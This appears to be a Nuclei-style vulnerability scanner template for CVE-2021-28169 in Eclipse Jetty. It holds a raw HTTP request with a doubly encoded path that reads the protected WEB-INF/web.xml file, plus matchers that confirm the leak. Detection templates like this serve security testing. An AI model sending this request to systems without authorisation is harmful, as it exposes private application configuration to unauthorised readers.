id: cve-2021-28169
info:
  name: Jetty File Read
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    For Eclipse Jetty versions <= 9.4.40, <= 10.0.2, <= 11.0.2, it is possible for requests to the ConcatServlet with a doubly encoded path to access protected resources within the WEB-INF directory. For example, a request to /concat?/%2557EB-INF/web.xml can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28169
    - https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq
  classification:
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.6
    cve-id: CVE-2021-28169
    cwe-id: CWE-200
  tags: information-disclosure,jetty
http:
  - raw:
      - |
        GET /static?/%2557EB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<web-app>"
          - "<display-name>"
          - "Archetype Created Web Application"
        part: body
